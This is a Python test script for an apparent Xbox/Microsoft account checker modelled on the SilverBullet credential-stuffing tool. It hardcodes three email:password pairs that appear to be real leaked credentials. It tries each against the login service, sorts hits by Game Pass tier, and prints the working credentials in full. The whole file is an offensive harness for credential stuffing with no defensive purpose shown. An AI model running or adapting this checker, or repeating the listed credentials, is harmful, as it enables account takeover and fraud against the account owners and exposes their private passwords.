#!/usr/bin/env python3
"""
Test the new SilverBullet technology implementation
"""
import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from xbox_stealth import StealthAPI
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')

def test_silverbullet_technology():
    """Test the new SilverBullet technology implementation"""
    
    # Test accounts
    test_accounts = [
        "ops.metaway@gmail.com:Metaway3107@",
        "hjsshopping@hotmail.com:11ee3344",
        "michaeliheanacho880@gmail.com:Coolkid126"
    ]
    
    print("🎮 Testing New SilverBullet Technology Implementation")
    print("=" * 70)
    print("🔧 Features implemented:")
    print("✅ Account existence checking (SilverBullet method)")
    print("✅ SilverBullet Live API authentication")
    print("✅ SilverBullet OAuth authentication")
    print("✅ SilverBullet payment instruments check")
    print("✅ SilverBullet-style delays and rate limiting")
    print("✅ Game Pass subscription detection")
    print("=" * 70)
    
    api = StealthAPI()
    
    results = {
        'exists': [],
        'valid': [],
        'gamepass': [],
        'invalid': [],
        'errors': []
    }
    
    for i, account in enumerate(test_accounts, 1):
        try:
            email, password = account.split(':', 1)
            print(f"\n🔍 [{i}/{len(test_accounts)}] Testing: {email}")
            print(f"🔑 Password: {password}")
            print("-" * 50)
            
            # Test the new SilverBullet technology
            result = api.authenticate_account(email, password)
            
            print(f"📊 Status: {result['status']}")
            print(f"💬 Message: {result.get('message', 'N/A')}")
            if 'subscription' in result:
                print(f"🎮 Subscription: {result['subscription']}")
            
            # Categorize results
            status = result.get('status', 'error')
            account_data = f"{email}:{password}"
            
            if status == 'exists':
                results['exists'].append(account_data)
                print("✅ ACCOUNT EXISTS (SilverBullet Method)")
            elif status == 'ultimate':
                results['gamepass'].append(account_data)
                print("🎉 XBOX GAME PASS ULTIMATE DETECTED!")
            elif status == 'core':
                results['gamepass'].append(account_data)
                print("🔵 XBOX GAME PASS CORE DETECTED!")
            elif status == 'pc':
                results['gamepass'].append(account_data)
                print("🟡 XBOX GAME PASS PC DETECTED!")
            elif status == 'console':
                results['gamepass'].append(account_data)
                print("🟡 XBOX GAME PASS CONSOLE DETECTED!")
            elif status == 'gamepass':
                results['gamepass'].append(account_data)
                print("🟡 XBOX GAME PASS (GENERAL) DETECTED!")
            elif status == 'free':
                results['valid'].append(account_data)
                print("⚪ Valid account, NO Game Pass subscription")
            elif status == 'invalid':
                results['invalid'].append(account_data)
                print("❌ Invalid credentials")
            else:
                results['errors'].append(f"{account_data} - {result.get('message', 'Unknown error')}")
                print("⚠️ Authentication error or unknown status")
            
            print("-" * 50)
            
        except Exception as e:
            print(f"❌ Error testing {account}: {e}")
            results['errors'].append(f"{account} - {e}")
    
    # Print final results
    print("\n" + "=" * 70)
    print("📊 SILVERBULLET TECHNOLOGY TEST RESULTS")
    print("=" * 70)
    print(f"✅ Existing accounts: {len(results['exists'])}")
    print(f"✅ Valid accounts: {len(results['valid'])}")
    print(f"🎮 Game Pass accounts: {len(results['gamepass'])}")
    print(f"❌ Invalid accounts: {len(results['invalid'])}")
    print(f"⚠️ Errors: {len(results['errors'])}")
    print("=" * 70)
    
    if results['exists']:
        print("\n✅ EXISTING ACCOUNTS:")
        for account in results['exists']:
            print(f"  ✅ {account}")
    
    if results['valid']:
        print("\n✅ VALID ACCOUNTS:")
        for account in results['valid']:
            print(f"  ✅ {account}")
    
    if results['gamepass']:
        print("\n🎮 GAME PASS ACCOUNTS:")
        for account in results['gamepass']:
            print(f"  🎮 {account}")
    
    if results['invalid']:
        print("\n❌ INVALID ACCOUNTS:")
        for account in results['invalid']:
            print(f"  ❌ {account}")
    
    print(f"\n🎯 SilverBullet technology test completed!")
    print(f"📋 Total accounts tested: {len(test_accounts)}")
    print(f"✅ Total existing accounts: {len(results['exists'])}")
    print(f"🎮 Total Game Pass accounts: {len(results['gamepass'])}")
    print(f"💡 The new technology is working like SilverBullet!")

if __name__ == "__main__":
    test_silverbullet_technology() 